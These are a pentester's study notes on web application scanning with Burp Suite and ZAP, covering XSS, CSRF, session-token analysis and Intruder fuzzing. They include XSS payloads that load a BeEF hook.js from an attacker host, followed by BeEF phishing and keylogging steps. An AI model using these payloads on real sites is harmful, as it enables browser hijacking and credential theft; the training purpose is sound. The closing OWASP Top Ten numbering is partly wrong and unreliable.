# Web Application Scanning

Note: *This is the first cookbook in a series that revisits and reinforces techniques from "The Hacker Playbook 2: A Practical Guide to Penetration Testing." I'll begin with web application scanning, an area where I still feel underprepared. This cookbook is designed to solidify my knowledge and understanding of web application scanning, providing a foundation for exploring more advanced techniques in the future.*

*Summarization of Web Application Scanning: Chapter Review (starting from page 81)*

In this chapter, we delve into web application scanning, summarizing the essential steps and tools for effective penetration testing. After completing our OSINT research, creating password lists, and running vulnerability scanners, the next logical step is to focus on web application scanning. Although many companies routinely use vulnerability scanners, outdated vulnerabilities like ms08-067 are becoming less frequent. For infrastructures that generally patch well, web application scanning can be invaluable during a network penetration test.

While there are many excellent open-source tools available—such as ZAP, WebScarab, Nikto, and w3af—this chapter focuses on a quick and efficient approach using Burp Suite, particularly the Burp Suite Pro version. Though the free version is quite capable, Burp Suite Pro offers enhanced features that streamline the scanning process. This guide doesn't aim to cover comprehensive web application penetration testing but rather focuses on what's typically done during a network penetration test. For those looking to dive deeper into web application security, resources like The Web Application Hacker's Handbook are recommended.

Steps for Efficient Web Application Scanning with Burp Suite:

- Spider/Discovery/Scanning with Burp Pro

- Scanning with a Web Application Scanner

- Manual Parameter Injection

- Session Token Analysis

Once you've run tools like Nessus or Nexpose to identify common vulnerabilities, it's time to dig deeper into the web application using Burp Suite. The following steps will guide you through configuring and using Burp Suite effectively:

- Enable Burp Suite / Configure Proxy

- Spider Through the Application

- Discover Content

- Run the Active Scanner

- Exploit Vulnerabilities

Burp Suite operates by intercepting and analyzing web traffic between your browser and the web application. This allows you to modify requests, even bypassing client-side protections. To start, launch Burp Suite on your Windows or Kali system and ensure your proxy is enabled and listening on port 8080. Navigate to the Proxy tab, then to Options, and confirm that Burp is running. If you change the default port, remember to update your browser's configuration accordingly.

Note: *A screenshot under the Proxy - Options tab would typically show the Proxy Listeners settings, where a checkbox should be ticked to enable it. The Interface tab would display ```*:8080```, indicating that Burp Suite is listening on all interfaces on port 8080. Additionally, the "Intercept requests based on the following rules" option is likely enabled by default. This option includes a condition to exclude specific file types like GIF, JPG, PNG, CSS, JS, and ICO from interception, optimizing the focus on more relevant traffic.*

To configure your browser to use the port on which Burp Proxy is listening, I recommend using the FoxyProxy add-on for Firefox. This add-on simplifies switching between multiple proxy configurations. You'll most likely find a fox icon next to the browser's URL bar—click on it, select "Add New Proxy," and then click on the "Proxy Details" tab. Set the Manual Proxy Configuration to 127.0.0.1 (localhost) and the proxy port to 8080. Next, return to the "General" tab, assign a name to your proxy, and save the configuration.

By doing this, you've directed your browser to route all traffic through localhost:8080, where Burp Suite is listening. Burp will capture this traffic and proxy it to the Internet. Now, right-click on the FoxyProxy icon, and select your newly created proxy configuration (e.g., "Burp Suite") from the dropdown list, ensuring that all traffic is routed through Burp Suite.

With your browser configured, navigate to the web application you identified earlier (e.g., www.securepla.net). If everything is set up correctly, you should see the "Proxy/Intercept" tab in Burp Suite light up, indicating that Burp has successfully captured the GET request. This tab allows you to view and modify any requests before they reach the web application. By default, Burp intercepts all traffic, allowing you to review and potentially alter each request. If you don't need to modify every request, turn off the "Intercept" button. This action still captures all traffic but lets it flow uninterrupted. You can review these requests and responses later in the "History" tab.

Next, go to the "Target" tab in Burp Suite. You'll see the URL you just intercepted and forwarded. To define the scope of your testing, right-click on the domain and select "Add to Scope." This step is crucial as it restricts automated spidering and testing to the domains within your defined scope, ensuring you don't inadvertently scan out-of-scope domains.

Note: *summary of steps and Key Tabs/Options used so far:*

1. Configure Network Proxy:

- Use FoxyProxy in Firefox.

- Set Manual Proxy Configuration to 127.0.0.1 and port 8080.
		
- Save the proxy configuration.

2. Set Up Burp Suite:

- Ensure Burp Proxy is listening on port 8080.
		
- Enable the proxy configuration in your browser.

3. Intercept Traffic:

- Navigate to the web application (e.g., www.securepla.net).
		
- Verify traffic capture in the Proxy/Intercept tab.
		
- Optionally, turn off the "Intercept" button to capture traffic without manual tampering.

4. Set the Scope:

- Go to the Target tab.

- Right-click on the domain and select "Add to Scope."

**Spidering the Application:**

The first crucial step in web application testing is to spider the host. Spidering involves Burp Suite crawling through the entire website to record all different files, forms, and HTTP methods used on the site. This process is essential because it helps identify all the links, the types of parameters used, external sites the application references, and the overall structure and functionality of the application.

To spider your application, navigate to the Target tab and then to the Site map tab. Right-click on the domain you want to spider, and select “Spider this host.”

Once spidering is complete, Burp Suite will have mapped out the application’s layout. In the left-hand column, you can see all the files and folders that were discovered. On the right-hand side, you can view the corresponding requests and responses. Below the Site map tab, there’s a Filter button. Experiment with the filter settings to refine your view according to your needs. Generally, it’s helpful to first add all relevant domains to your scope and then filter the view to show only those within scope. This approach tidies up your workspace by excluding out-of-scope referenced domains.

Note: *mini-summary of important steps:*

1. Spider the Application:

- Go to the Target tab, then the Site map tab.

- Right-click the domain and select “Spider this host.”

2. Review the Spidering Results:

- Left column: View discovered files and folders.

- Right column: Examine requests and responses.

3. Filter the Results:

- Use the Filter button to customize your view.

- Filter to show only in-scope domains to streamline your analysis.

**Discover content:**

During web application testing, there are instances when certain pages or folders are not directly linked from within the application. For example, administrative directories or login pages might be concealed from general user access. While you may encounter the /admin/ folder by manually navigating to it, such directories might be overlooked during the spidering phase. This is often a deliberate attempt by administrators to obscure these sensitive areas.

To address this, Burp Suite offers a useful feature within the Site map tab. Right-click the parent URL, navigate to "Engagement tools," and select "Discover content."

In the Discovery module, click on the "Session is not running" button to initiate "smart brute forcing." This process involves Burp Suite intelligently brute-forcing folders and files by learning from the structures it identifies. This technique efficiently locates hidden directories and files, which are crucial for in-depth testing.

For example, as demonstrated in the book, the Discovery tool identified the /wp-includes/ folder, common in WordPress applications, and began probing for typical files and folders within it. By reviewing the results in the Site map tab of the Discovery module, you can uncover hidden folders, admin pages, configuration files, and other important resources.

Note: *summary of important steps:*

- Access Discovery Tool: Right-click on the parent URL in the Site map tab, navigate to "Engagement tools," and select "Discover content."

- Start Smart Brute Forcing: Click "Session is not running" to begin smart brute-forcing, which learns and refines its search for hidden directories and files.

- Review Results: Use the Site map tab to view discovered content, such as hidden admin pages and configuration files.

Note: *In the realm of web application scanning, custom wordlists can greatly enhance the effectiveness of your assessments. The book mentions the RAFT wordlist, which was once a preferred tool for many. Unfortunately, RAFT is no longer actively developed, and obtaining the specific wordlist may be challenging. There are several alternative approaches and sources for effective wordlists.*

*Tools like SecLists and FuzzDB provide comprehensive wordlists that are frequently updated and widely used in the community. These can serve as excellent substitutes for the RAFT list. Also, tailoring your own wordlists based on the specifics of the target application can often yield better results. Use tools like Cewl to generate wordlists from the target’s website content.*

**The Active Scanner:**

Once you’ve mapped out a substantial portion of the site, you can begin attacking parameters, requests, and searching for vulnerabilities. To initiate this process, right-click on the parent domain in Burp Suite and select 'Actively scan this host.' This command triggers Burp's application scanner to start fuzzing input parameters. Be aware that this process can generate a lot of network traffic and submit numerous queries to the application. If the application includes features like a comment box, this could lead to an excessive number of emails being sent to the customer as a result of the scanning.

While the scanner is running, you can monitor the results and testing queue within the 'Scanner' tab. To optimize the scanning process, navigate to the 'Options' tab within the Scanner section. A common adjustment is to increase the number of threads in the Active Scan Engine section to reduce scan times. However, use this feature cautiously, as setting the thread count too high can potentially overwhelm a smaller site.

Reviewing the scan results, you might find vulnerabilities such as XSS. Burp Suite provides detailed information about the issue, including the request that triggered it and the response received.

To verify the findings and rule out false positives, examine the specific GET parameter reported. For instance, Burp might identify a vulnerability with a URL like: http://www.securepla.net/xss_example/example.php?alert=9228a%3Cscript%3Ealert(1)%3C/script%3E281717daa8d. Entering this URL in a browser should confirm whether the vulnerability is real.

Burp Suite's scanning capabilities extend beyond XSS. It can detect various other vulnerabilities, including CSRF issues, SSL certificate problems, directory traversal, SQL injections, and command injections.

Note: *a high-level overview of how Cross-Site Scripting (XSS) attacks work:*

*The attacker injects malicious scripts (usually JavaScript) into a web application. This can occur through user input fields, URLs, or other means where input is not properly sanitized. Using XSS attacks the attacker can hijack user sessions, deface websites, redirect users to malicious sites, or spread malware.*

*When a user interacts with the web application (e.g., visiting a page or submitting a form), the malicious script is executed in the user's browser. This happens because the web application fails to properly filter or escape the injected content.*

*The script runs within the context of the web application, which means it has access to the same cookies, local storage, and session data as the legitimate user. This allows the attacker to steal sensitive information (like session tokens or cookies), manipulate web content, or perform actions on behalf of the user. Depending on the type of XSS (Stored, Reflected, or DOM-based), the impact can vary.*

- *Stored XSS: Malicious script is permanently stored on the server (e.g., in a database) and executed whenever someone loads the affected page.*

- *Reflected XSS: The script is embedded in a URL or input field and immediately executed when the user clicks the link or submits the form.*

- *DOM-based XSS: The vulnerability exists in the client-side code (JavaScript) and is exploited through manipulation of the Document Object Model (DOM).*

Note: *summary of key steps:*

- Initiate Scanning: Right-click the parent domain and select "Actively scan this host."

- Configure Scan Settings: Adjust thread count in the 'Options' tab under the Scanner section to optimize scan times.

- Monitor Results: View findings in the 'Scanner' tab.

- Verify Vulnerabilities: Check the reported vulnerabilities by replicating the requests in a browser to confirm their validity.

## OWASP Zed Attack Proxy versus Burp Suite

The open-source counterpart to Burp Suite Pro for web application testing is the OWASP Zed Attack Proxy (ZAP). Despite being a commercial tool, Burp Suite Pro, ZAP offers many similar functionalities, including proxying traffic, fuzzing requests, spidering, and automated scanning. You can run ZAP on Windows or OS X by double-clicking the OWASP ZAP executable, or on Kali Linux with the owasp-zap command. For this example, we'll be testing against the vulnerable owaspbricks application hosted on OWASPBWA.

Upon launching ZAP, you'll encounter the welcome screen. Input the URL http://[IP of VM]/owaspbricks/ and click 'Attack.' ZAP will then automatically conduct spidering and vulnerability scanning.

After the scan completes, navigate to the 'Alerts' tab to review the identified vulnerabilities. This approach of scanning with multiple tools is as crucial as using both Nessus and Nexpose for network-based vulnerabilities. The book demonstrates a side-by-side comparison of the same application scanned by both ZAP and Burp Suite. The results reveal different vulnerabilities, locations, and types, highlighting the varied findings from each tool.

The common question is: Which tool is better? The answer is context-dependent. Using both tools is generally recommended, as they each offer unique advantages. Burp Suite Pro, for example, is favored by the security community for its Burp Extender feature, allowing for the creation of custom scanning tools.

Burp Suite excels in scenarios involving complex application workflows or multi-step processes before fuzzing parameters. For example, if an application requires authentication or involves sequential steps (such as filling out forms or navigating through several pages) before accessing a certain parameter, Burp Suite's advanced session handling and customization features can effectively manage these requirements. This capability allows for more accurate and efficient testing of complex web applications.

## More on Cross-Site Scripting (XSS)

The BeEF (Browser Exploitation Framework) is an exceptional tool for leveraging XSS (Cross-Site Scripting) attacks. With BeEF, if you identify a valid XSS vulnerability, you can not only capture the victim's browser session but also perform actions like stealing clipboard content, redirecting the user, activating their webcam, and much more. To make use of BeEF with an XSS vulnerability, you need to craft your XSS payload to interact with the BeEF Framework.

For our example, we'll use an XSS vulnerability discovered through Burp Suite’s Active Scans. Consider the following vulnerable URL:
```http://www.securepla.net/xss_example/example.php?alert=test'<script>[iframe]</script>```

Firstly, ensure the BeEF service is running. Once BeEF is up and running, log into the BeEF web interface at ```http://127.0.0.1:3000/ui/authentication```. If everything is set up correctly, you should be able to log in using the default credentials: username “beef” and password “beef”.

In the terminal where BeEF was launched, you'll find URLs for both the web interface and the hook page (Hook URL). The hook page, which is a JavaScript file, contains the payload that will control the victim's browser once injected. This script is designed to connect the victim’s browser back to your central BeEF server without their knowledge.

After identifying an XSS vulnerability using tools like Burp Suite or ZAP on a Web Application VM (OWASP BWA), you can exploit it directly. For example:
```http://[IP_of_OWASPBWA]/owaspbricks/content-2/index.php?user=harry3a201<script>alert(1)<%2fscript>6f350```

This URL shows that the user parameter on the vulnerable page processes and displays JavaScript code. This confirms that the XSS vulnerability can execute JavaScript within the context of the victim’s browser.

To create a successful exploit, you can use JavaScript to include the hook.js file from your BeEF server. For instance, you might craft a URL like:
```http://192.168.1.124/owaspbricks/content-2/index.php?user=harry3a201<script src=http://192.168.1.123:3000/hook.js></script>```

This URL injects the hook.js script into the vulnerable page, allowing BeEF to control the victim’s browser.

Another way to inject the hook.js script is by using various JavaScript techniques. For example:

- Image Injection: ```<img src="http://192.168.1.123:3000/hook.js">```

- Iframe Injection: ```<iframe src="http://192.168.1.123:3000/hook.js"></iframe>```

These methods work similarly by causing the victim's browser to fetch and execute the hook.js script from your BeEF server.

Remember, if this is done on a public site, the URL must point to a publicly accessible address hosting the hook.js page and listening service.

Once the victim visits the crafted URL, using Social Engineering tactics, they will become part of your XSS zombie network. In the BeEF UI, you should see the victim’s browser listed under the "Hooked Browsers" panel on the left.

With an account hooked, BeEF provides various modules to exploit the victim. As demonstrated in the book, you can steal stored credentials, gather host IP information, scan hosts within their network, and more. This functionality is accessible through the "module tree" panel on the right.

One effective attack is the "Pretty Theft" module, which is simple yet powerful. Go to the Social Engineering folder, select Pretty Theft, and configure it as needed. For example, if you choose the Facebook template, input your BeEF server IP in the custom logo field. This allows the victim to retrieve the image from your server.

Upon executing the attack, a Facebook password prompt will appear on the victim’s system. You can customize this prompt to increase the likelihood that the target will enter their credentials. For gaining access to Google accounts, there is also a Google Phishing module available.

The advantage of this client-side attack is that the seemingly normal password prompt keeps the victim unaware of their participation in the zombie network.

After the victim enters their password, return to the BeEF UI to review the captured information. Clicking on the ID “0” will reveal what the victim typed. This information can be used to gain access and potentially move laterally within the environment.

As illustrated, an XSS vulnerability can be extremely powerful. If the XSS vulnerability was stored rather than reflected, the impact would be even more severe. A stored XSS does not require the victim to visit a specially crafted URL; the malicious script would execute automatically whenever the victim interacts with the affected application.

Note: *Other powerful BeEF attacks:*

- *Social Engineering Module (Phishing): Besides "Pretty Theft," BeEF includes other phishing modules for different services like Google, Twitter, or LinkedIn. These modules create fake login pages for various platforms, aiming to capture user credentials when victims log in.*

- *Credential Forwarding: This module sends captured credentials to an external service or server. It's useful for aggregating collected data from multiple phishing attempts.*

- *Keylogger Module: BeEF can deploy keyloggers on the victim’s browser. This captures keystrokes, including passwords and other sensitive information. Keyloggers can be delivered via XSS and are particularly effective if combined with social engineering techniques.*

- *Browser Exploitation Framework (BeEF): BeEF can exploit various browser vulnerabilities to gain deeper access. This includes exploiting weaknesses in the browser's security features to perform actions like taking screenshots or accessing local files.*

- *Metasploit Integration: BeEF can be integrated with Metasploit for more advanced attacks. For example, once a victim is hooked, Metasploit can be used to perform more sophisticated attacks, such as remote code execution.*

- *Internal Network Scanning: BeEF can perform internal network scans from the victim’s browser to discover other devices and services within the victim's network. This is valuable for lateral movement and further exploitation.*

Note: *Here’s a concise workflow reminder highlighting the crucial steps in exploiting an XSS vulnerability using BeEF as demonstrated above:*

1. **Identify the XSS Vulnerability:**

- Use tools like Burp Suite or ZAP to discover XSS vulnerabilities in the target web application.

2. **Start BeEF:**

- Launch the BeEF service.

- Access the BeEF web interface at http://127.0.0.1:3000/ui/authentication and log in using the default credentials: username: beef and password: beef.

3. **Obtain Hook URL:**

- In the BeEF terminal, note the Hook URL provided (e.g., http://192.168.1.123:3000/hook.js).

4. **Craft the XSS Payload:**

- Create a payload to inject the BeEF hook script into the vulnerable page. Example URL:

```
http://192.168.1.124/owaspbricks/content-2/index.php?user=harry3a201<script src=http://192.168.1.123:3000/hook.js></script>
```

5. **Alternative Injection Methods:**

- Image Injection:

```
<img src="http://192.168.1.123:3000/hook.js">
```

- Iframe Injection:

```
<iframe src="http://192.168.1.123:3000/hook.js"></iframe>
```

6. **Exploit the Vulnerability:**

- Ensure the URL points to a publicly accessible address if targeting a public site. Use social engineering to entice the victim to visit the crafted URL.

7. **Monitor Hooked Browsers:**

- Check the BeEF UI under the "Hooked Browsers" panel to confirm the victim’s browser is hooked.

8. **Utilize BeEF Modules:**

- Access and use BeEF’s modules to exploit the victim. Examples include:

- Pretty Theft: Create phishing pages, like a Facebook login prompt, by configuring the Social Engineering module.

- Google Phishing: Similar phishing techniques for Google accounts.

9. **Review Captured Data:**

- After the victim interacts with the phishing prompt or other modules, review captured information in the BeEF UI. Click on the ID (e.g., “0”) to see what the victim entered.

## XSS Obfuscation

A common challenge for attackers when injecting code is dealing with input validation implemented by the application. Even if an XSS vulnerability exists, stringent filters may prevent the use of certain characters needed for a successful attack. However, these filters are often imperfectly configured, which can be advantageous for pentesters. Due to the numerous encoding techniques available, these filters frequently fail to block all methods of XSS attack.

One valuable resource for overcoming these encoding issues is the OWASP Evasion Cheat Sheet. This guide is typically the first place worth consulting when encountering problems with input validation during engagements. It offers a range of techniques to bypass filters that restrict common XSS characters, such as greater-than (>) and less-than (<) symbols, or to address length constraints imposed by the application.

Note: *this cheat sheet can be found here:* https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

XSS obfuscation refers to the techniques used to disguise or encode malicious payloads to evade detection and filtering by security measures. Here’s why it's crucial:

- Bypassing Filters: Many applications implement filters to block certain characters or patterns associated with XSS attacks. Obfuscation helps bypass these filters by encoding payloads in ways that the filters may not recognize. For example, using different encoding schemes (like hexadecimal or URL encoding) or breaking up payloads can help evade detection.

- Evasion of Detection Mechanisms: Modern web applications may employ various security mechanisms to detect and block XSS attacks. Obfuscation makes it harder for these mechanisms to identify malicious code. For example, using JavaScript’s built-in functions to encode or obfuscate payloads can help avoid detection by security tools that look for specific attack patterns.

- Increasing Success Rates: By crafting payloads that are less likely to be blocked or detected, attackers increase their chances of successfully exploiting the XSS vulnerability. Obfuscation can help ensure that the attack payload executes as intended, even if some parts of the payload are altered or filtered.

- Adaptation to Filtering Techniques: As web application security evolves, so do filtering techniques. Obfuscation provides a way to adapt to new filtering techniques by using creative encoding methods and payload crafting strategies.

Overall, XSS obfuscation is a critical skill for both attackers and defenders. Understanding and applying these techniques allows security professionals to better assess the robustness of an application’s input validation and develop more effective countermeasures.

## Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is an attack that tricks a victim into performing unwanted actions on a website where they are authenticated. For instance, if a victim is logged into their bank account and you send them a malicious link, that link could automatically transfer money from their account to yours, without their knowledge. This happens because the application does not verify whether the request was intentionally made by the legitimate user.

In a well-designed application, CSRF tokens are used to prevent this type of attack. When a user performs an action like transferring money, the application generates a unique CSRF token that is associated with the user’s session. This token is included in every request related to sensitive actions. The server verifies this token with each request to ensure that it originated from the legitimate user and was not forged by an attacker.

Here's a simplified overview of how CSRF protection works:

1. User Login and Token Generation: After logging in, a user is given a unique CSRF token.

2. Token Inclusion: This token is included in each form submission or sensitive request as a hidden field.

3. Token Verification: When a request is made, the server checks that the token is present and valid before processing the request. If the token is missing or incorrect, the server rejects the request.

To test for CSRF vulnerabilities manually, you can use tools like a proxy to intercept and manipulate requests. Here’s a basic approach to testing for CSRF vulnerabilities:

1. Perform the Action: First, complete the action normally (e.g., transferring money) while monitoring the requests with a proxy.

2. Intercept the Requests: Capture the request sent by the application when you perform the action.

3. Replay the Request: Try to replicate the action by replaying the captured request, but without going through the entire process. If the request is processed successfully without the appropriate CSRF token, it indicates a CSRF vulnerability.

The goal here is to see if you can execute the action without the necessary steps or tokens, proving that the application does not have adequate CSRF protection.

Additional notes:

- Token Expiration: Some applications use tokens that expire after a short period or after the user performs a certain action. Ensure the token is still valid when replaying requests.

- Token Scope: Tokens may be scoped to specific actions or forms. Testing should cover various scenarios to identify all potential vulnerabilities.

- Secure Storage: Tokens should be securely stored and transmitted to prevent exposure or leakage.

**Example of Cross-Site Request Forgery (CSRF) Using Burp Suite:**

Consider a bank application that allows users to transfer money to one another. The following URL illustrates a request to transfer $123.44 to a user named Frank:

```
securepla.net/xss_example/bank.php?User=Frank&Dollar=123.44
```

To test for CSRF vulnerabilities using Burp Suite, follow these steps:

1. Capture the Request: Ensure that your browser is configured to proxy through Burp Suite. Initiate the transfer by filling out the form on the bank's transfer page. This action should be captured by Burp Suite in the Proxy tab under "HTTP history."

2. Examine the Request: In the Burp Suite Proxy tab, find the captured request for the bank transfer. Check if the request includes a CSRF token or any other form of protection. For example, in the screenshot from the book, you would observe a hook cookie but no CSRF token.

Note: *The actual screenshot from the book is not included here.*

3. Replay the Request: To determine if the request can be repeated without additional steps, right-click on the captured request and select "Send to Repeater."

4. Execute the Request: In the Repeater tab, click the "Go" button to resend the request. If the transfer occurs again without requiring user confirmation or additional verification, it indicates a CSRF vulnerability. In this case, you could potentially exploit this by sending the same link to all users, resulting in unauthorized transfers.

5. Assessment: Ideally, the application should have a CSRF protection mechanism, such as a CSRF token, that ensures users must go through the proper steps to authenticate each transfer request. The absence of such protection can lead to unauthorized transactions when unsuspecting users click on malicious links.

For more information on CSRF attacks and mitigation strategies, refer to the OWASP CSRF page: https://owasp.org/www-community/attacks/csrf

## Session Tokens

Session tokens are crucial for tracking user sessions because HTTP, by default, is a stateless protocol. Effective session management involves ensuring that session tokens are secure, unpredictable, and properly validated. Specifically, you should verify that session tokens:

- Cannot be guessed: They should be sufficiently random and unique.

- Properly track a user: They should accurately associate with a specific user session.

- Expire appropriately: Tokens should have a limited lifespan to reduce risk if compromised.

- Are secure: Tokens should be protected against interception and misuse.

- Validate input: Ensure that tokens are not subject to common vulnerabilities.

To evaluate the strength and security of session tokens, Burp Suite's Sequencer tool is highly effective. Follow these steps:

1. Capture Session Tokens: Start by capturing an authentication request using Burp Suite. You can find session tokens under the main "Proxy" tab and sub-tab "History".

2. Send to Sequencer: Right-click on the raw response section and select “Send to Sequencer.” Navigate to the Sequencer tab in Burp Suite.

3. Start Live Capture: In the Sequencer tab, select the session token of interest and click “Start Live Capture.” This action will begin collecting session tokens for analysis.

4. Analyze Tokens: After capturing a sufficient number of tokens, Burp Suite will provide various analyses, including:

- Entropy Analysis: Measures the randomness of the tokens. Higher entropy indicates better randomness.

- Character-Level Analysis: Examines the distribution of characters to identify patterns or biases.

- Bit-Level Analysis: Assesses the randomness at the bit level, providing insights into the predictability of the token.

5. Review Results: Burp Suite will offer a summary of these analyses to help you understand the quality and security of the session tokens. Familiarize yourself with these features to effectively evaluate token strength.

In evaluating session tokens, experience plays a crucial role. The security of session cookies can vary significantly across different web applications due to diverse implementations and algorithms used to generate them. While the techniques and tools mentioned earlier, such as Burp Suite’s Sequencer, are useful for analyzing token security, it's important to apply judgment based on the context. Common indicators of insecure session tokens include predictability, insufficient length, low entropy, static values, and unencrypted transmission. Reviewing application source code and running security tests can provide further insights into the robustness of session tokens. Developing an intuitive understanding of these aspects comes with experience and thorough analysis.

## Additional Fuzzing/Input Validation

Burp Suite's Intruder function is a powerful tool for manual testing and can be extremely useful for fuzzing and input validation. This feature allows you to manipulate any part of an HTTP request and inject custom data, making it ideal for testing various parameters.

To illustrate the usefulness of the Intruder tool, consider an online store where only certain items are linked on the website, while others, such as upcoming sale items, might be hidden. By brute-forcing through URL parameters, you can uncover information that isn't directly linked or made public yet. This technique can be particularly effective for sites with seasonal sales or promotions, where you might discover details about upcoming sales before they're officially announced.

For example, let’s use a dummy website to demonstrate this process. Suppose you have a URL like:

```
www.securepla.net/tehc/hack.php?id=2
```

Here, the id parameter can be manipulated to explore different results. To find out which pages exist and what content might be available, follow these steps:

- Capture the Request: Ensure your traffic is flowing through Burp Suite. Go to the Proxy tab and find the request in the History tab. Right-click on this request and select “Send to Intruder.”

- Configure Intruder: Switch to the Intruder tab and go to the Positions tab. You'll see highlighted sections in the request. Since you only want to test the id parameter, click the "Clear" button to remove all highlights. Then, manually highlight the 2 value (the current parameter value) and click the "Add" button. This tells Burp to only fuzz the id parameter, which will now be highlighted in yellow.

- Choose Attack Type: Select the attack type. For this example, you might use the default "Sniper" type, which tests individual payloads one by one. Each attack type in Burp Suite has specific purposes, so it’s beneficial to review the different options available on Burp Suite’s documentation or site.

Burp Suite’s Intruder offers various attack types to suit different testing needs:

- Sniper: This type tests individual payloads against a single parameter. It is useful for finding vulnerabilities in parameters that accept a wide range of inputs.

- Battering Ram: This attack type applies the same payload to multiple positions in the request simultaneously. It is ideal for scenarios where the same input needs to be tested across multiple parameters.

- Pitchfork: This attack type allows you to send multiple payloads in parallel across multiple parameters. It’s useful for more complex testing where you need to test combinations of inputs.

- Cluster Bomb: This type is used for combinatorial attacks where different sets of payloads are tested against different parameters in all possible combinations. It’s useful for testing complex input scenarios where different parameters might interact in unexpected ways.

In Burp Suite’s Intruder, navigate to the Payloads tab. Click the "Load" button to import your list of payloads. In this example, we’re loading a simple list of numbers ranging from 1 to 100. However, you can use various types of payload lists depending on your testing needs. For instance, if you’re testing database or LDAP queries, you might import a list of potential query parameters. The choice of payloads depends on the specific parameter you’re testing and the nature of the application.

After loading your payload list, initiate the attack by going to the top menu bar, selecting "Intruder," and then clicking "Start attack." This action opens a new Intruder Attack window where Burp Suite will begin sending requests with each payload.

As Burp Suite processes the requests, you’ll need to determine if any changes occurred based on the injected parameters. One straightforward method is to compare the length of the page source code. If the length differs from a baseline measurement, it indicates that the injection had an effect.

For example, if the standard page source length is 299 characters, and you find a response with a length of 315 characters, this difference could signal a change in the page due to your payload. In the book’s example, parameter values ranging from 5 to 26 resulted in a page length of 299. However, a request with the parameter 27 resulted in a page length of 315, revealing a hidden password: “dont hack me.”

Besides URL parameters, consider testing other elements of the request such as cookies, GET/POST/HEAD parameters, and user-agent strings. Fuzzing these components can uncover additional vulnerabilities or unintended behaviors.

Note: *Intruder workflow reminder:*

1. **Capture the Request:**

- Ensure traffic is routed through Burp Suite.

- Go to the Proxy tab and find the relevant request in the History tab.

- Right-click on the request and select “Send to Intruder.”

2. **Configure Intruder:**

- Switch to the Intruder tab and go to the Positions tab.

- Click “Clear” to remove existing highlights.

- Highlight the value you want to fuzz (e.g., id=2) and click “Add.” This isolates the parameter for testing.

3. **Choose Attack Type:**

- Sniper: Tests individual payloads against a single parameter.

- Battering Ram: Applies the same payload to multiple positions in the request.

- Pitchfork: Sends multiple payloads in parallel across multiple parameters.

- Cluster Bomb: Tests combinations of payloads against different parameters.

4. **Load Payloads:**

- Navigate to the Payloads tab.

- Click “Load” to import your payload list (e.g., numbers from 1 to 100).

- Depending on the test, use lists relevant to your application’s parameters.

5. **Start the Attack:**

- Click “Intruder” in the top menu and select “Start attack.”

- An Intruder Attack window will open, and Burp Suite will start processing the requests.

6. **Analyze Results:**

- Compare the response lengths to a baseline to identify changes.

- Example: If the standard page length is 299 characters, and a response with a parameter value results in 315 characters, it may indicate a change or reveal hidden content (e.g., a password).

7. **Explore Additional Parameters:**

- Test other components of the request such as cookies, GET/POST/HEAD parameters, and user-agent strings. Different attack types and payloads can reveal various vulnerabilities. Tailor your approach based on the application’s context and the parameters being tested.

Closing notes: The Open Web Application Security Project (OWASP) is widely recognized as the authority in identifying and categorizing web vulnerabilities. The OWASP Top Ten is a definitive list that highlights the most critical security risks to web applications, and it serves as a foundational resource for anyone involved in cybersecurity.

Understanding these vulnerabilities is essential not only for identifying and exploiting weaknesses but also for defending against them. You can start by reading through the OWASP Top Ten Cheat Sheet, which provides a concise overview of each vulnerability: https://owasp.org/www-project-top-ten/

Also, here are a few of the more common yet prevalent vulnerabilities from the OWASP Top Ten:

1. Injection (A01:2021):

- What It Is: Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing unauthorized data.

- Example: SQL Injection, where an attacker can manipulate a SQL query to bypass authentication or retrieve sensitive information.

2. Broken Authentication (A02:2021):

- What It Is: Authentication mechanisms that are poorly implemented can allow attackers to compromise passwords, session tokens, or keys, or even exploit other implementation flaws to assume other users' identities temporarily or permanently.

- Example: A login page that doesn't enforce strong password policies or uses predictable session tokens, making it easier for attackers to guess or hijack user sessions.

3. Cross-Site Scripting (XSS) (A03:2021):

- What It Is: XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping. This allows attackers to execute scripts in the victim's browser, which can lead to session hijacking, defacement, or redirecting the user to malicious sites.

- Example: An input field on a website that accepts user input without sanitizing it, allowing an attacker to inject malicious JavaScript.

4. Security Misconfiguration (A05:2021):

- What It Is: Security misconfiguration is the most common issue and results from using default configurations, showing detailed error messages, or missing security hardening across any part of the application stack.

- Example: A web server that exposes directories or configuration files that contain sensitive information, or an application that is deployed with default credentials.

5. Sensitive Data Exposure (A06:2021):

- What It Is: Many web applications do not properly protect sensitive data, such as financial, healthcare, and personal information. Attackers may steal or modify such data to conduct credit card fraud, identity theft, or other crimes.

- Example: An application that transmits sensitive information over an unencrypted connection, making it easy for attackers to intercept and exploit the data.

6. Cross-Site Request Forgery (CSRF) (A08:2021):

- What It Is: CSRF forces a logged-on user to execute unwanted actions on a web application in which they’re authenticated. CSRF attacks target state-changing requests, not theft of data since the attacker has no way to see the response to the forged request.

- Example: A malicious link that, when clicked by a logged-in user, causes them to unknowingly perform actions like transferring funds or changing their email address on a web application.
